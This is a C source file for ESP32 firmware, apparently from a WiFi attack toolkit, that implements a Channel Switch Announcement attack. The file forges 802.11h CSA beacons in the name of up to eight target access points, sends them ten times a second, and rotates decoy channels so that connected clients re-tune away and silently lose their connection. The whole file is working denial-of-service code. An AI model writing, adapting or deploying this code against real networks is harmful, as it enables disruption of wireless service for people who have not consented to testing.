/**
 * @file attack_csa.c
 * @author y4n0
 * @date 2026
 * @copyright Copyright (c) 2026
 *
 * @brief Channel Switch Announcement attack.
 *
 * The CSA IE is a normal part of 802.11h dynamic frequency selection: an AP can
 * tell its clients "I'm moving to channel X, switch with me". Clients trust it
 * because it comes from the BSSID they already associated with.
 *
 * We forge exactly that frame. The client re-tunes to the announced channel,
 * finds nothing there, and the association quietly dies. To the client it looks
 * like the AP moved; to the AP it looks like the client roamed away.
 */

#include "attack_csa.h"

#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "wsl_bypasser.h"
#include "wifi_controller.h"
#include "attack.h"

static const char *TAG = "main:csa";

typedef struct {
    wifi_ap_record_t ap;
    uint8_t          decoy;
} csa_target_t;

#define CSA_MAX_TARGETS 8
#define CSA_TICK_US     100000      /* 10 frames/s per target */
#define CSA_ROTATE_TICKS 50         /* rotate decoy every ~5 s */

static csa_target_t       s_targets[CSA_MAX_TARGETS];
static volatile uint8_t   s_target_count = 0;
static volatile bool      s_running      = false;
static csa_mode_t         s_mode         = CSA_MODE_ROTATE;
static esp_timer_handle_t s_timer        = NULL;
static uint32_t           s_tick         = 0;

/** Pick a decoy channel that isn't the AP's own channel. */
static uint8_t pick_decoy(uint8_t own)
{
    static const uint8_t pool[] = { 1, 6, 11, 13, 3, 8, 4, 9, 12, 2, 7, 5, 10 };
    for (int attempt = 0; attempt < 6; attempt++) {
        uint8_t c = pool[esp_random() % (sizeof(pool) / sizeof(pool[0]))];
        if (c != own && c >= 1 && c <= 14) return c;
    }
    return (own == 1) ? 6 : 1;
}

static void csa_timer_cb(void *arg)
{
    if (!s_running || s_target_count == 0) return;

    uint8_t count = s_target_count;
    s_tick++;

    if (s_mode == CSA_MODE_ROTATE && (s_tick % CSA_ROTATE_TICKS) == 0) {
        for (uint8_t i = 0; i < count; i++) {
            s_targets[i].decoy = pick_decoy(s_targets[i].ap.primary);
        }
        ESP_LOGD(TAG, "Decoy channels rotated");
    }

    for (uint8_t i = 0; i < count; i++) {
        wifi_ap_record_t *ap = &s_targets[i].ap;

        /* The frame has to leave on the AP's channel or nobody hears it. */
        if (esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
            continue;
        }

        wsl_bypasser_send_csa_beacon(ap->bssid,
                                     ap->ssid,
                                     (uint8_t)strnlen((const char *)ap->ssid, 32),
                                     ap->primary,
                                     s_targets[i].decoy);
    }
}

void attack_csa_start(attack_config_t *attack_config)
{
    if (s_running) {
        ESP_LOGW(TAG, "CSA already running");
        return;
    }
    if (attack_config == NULL || attack_config->target_count == 0) {
        ESP_LOGE(TAG, "CSA needs at least one target AP");
        return;
    }

    s_target_count = 0;
    s_tick         = 0;
    s_mode         = (attack_config->method == CSA_MODE_PUSH) ? CSA_MODE_PUSH : CSA_MODE_ROTATE;

    for (uint8_t i = 0; i < attack_config->target_count && i < CSA_MAX_TARGETS; i++) {
        const wifi_ap_record_t *src = attack_config->ap_records[i];
        if (src == NULL) continue;
        if (src->primary < 1 || src->primary > 14) continue;

        memcpy(&s_targets[s_target_count].ap, src, sizeof(wifi_ap_record_t));
        s_targets[s_target_count].decoy = pick_decoy(src->primary);
        s_target_count++;
    }

    if (s_target_count == 0) {
        ESP_LOGE(TAG, "CSA: no usable target channel");
        return;
    }

    esp_wifi_set_ps(WIFI_PS_NONE);
    s_running = true;

    if (s_timer == NULL) {
        const esp_timer_create_args_t targs = {
            .callback = &csa_timer_cb,
            .name     = "csa_beacon"
        };
        if (esp_timer_create(&targs, &s_timer) != ESP_OK) {
            s_running = false;
            ESP_LOGE(TAG, "CSA: timer create failed");
            return;
        }
    }

    if (esp_timer_start_periodic(s_timer, CSA_TICK_US) != ESP_OK) {
        s_running = false;
        ESP_LOGE(TAG, "CSA: timer start failed");
        return;
    }

    ESP_LOGI(TAG, "CSA started on %u target(s), mode=%s",
             s_target_count, s_mode == CSA_MODE_ROTATE ? "rotate" : "push");
}

void attack_csa_stop(void)
{
    if (!s_running) return;
    s_running = false;

    if (s_timer != NULL) {
        if (esp_timer_is_active(s_timer)) esp_timer_stop(s_timer);
        esp_timer_delete(s_timer);
        s_timer = NULL;
    }

    s_target_count = 0;
    vTaskDelay(pdMS_TO_TICKS(30));
    ESP_LOGI(TAG, "CSA stopped");
}

bool attack_csa_is_running(void)
{
    return s_running;
}
